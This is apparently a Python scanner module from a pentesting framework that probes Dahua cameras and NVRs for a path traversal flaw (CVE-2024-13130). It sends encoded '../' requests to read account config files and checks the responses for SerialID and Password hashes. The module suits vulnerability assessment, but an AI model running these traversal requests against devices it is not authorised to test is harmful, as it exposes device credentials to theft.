#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Dahua (and OEM) path traversal to account config files (CVE-2024-13130)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Dahua Devices - Path Traversal Account Leak (CVE-2024-13130)',
        'description': (
            'Multiple Dahua devices (and OEMs) allow path traversal to '
            '../mtd/Config/Sha1Account1 or Account1, leaking SerialID and Password hashes.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': [
            'web', 'scanner', 'cve', 'cve2024', 'dahua', 'camera', 'nvr', 'iot',
            'lfi', 'exposure', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/admin/http/camera/dahua_cve_2024_13130_file_read'],
            },
        },
        'references': [
            'https://netsecfish.notion.site/Path-Traversal-Vulnerability-in-IntelBras-IP-Cameras-mtd-Config-Sha1Account1-and-mtd-Confi-15e6b683e67c80809442ee3425f753b7',
            'https://nvd.nist.gov/vuln/detail/CVE-2024-13130',
        ],
        'cve': 'CVE-2024-13130',
    }

    def run(self):
        for suffix in ('/mtd/Config/Sha1Account1', '/mtd/Config/Account1'):
            # %2e%2e keeps ../ in the request path (requests normalizes literal ../)
            path = f'/%2e%2e{suffix}'
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ''
            if '"SerialID"' in body and '"Password"' in body:
                self.set_info(
                    severity='medium',
                    reason='Dahua CVE-2024-13130 path traversal (account config leaked)',
                    path=path,
                )
                return True
        return False
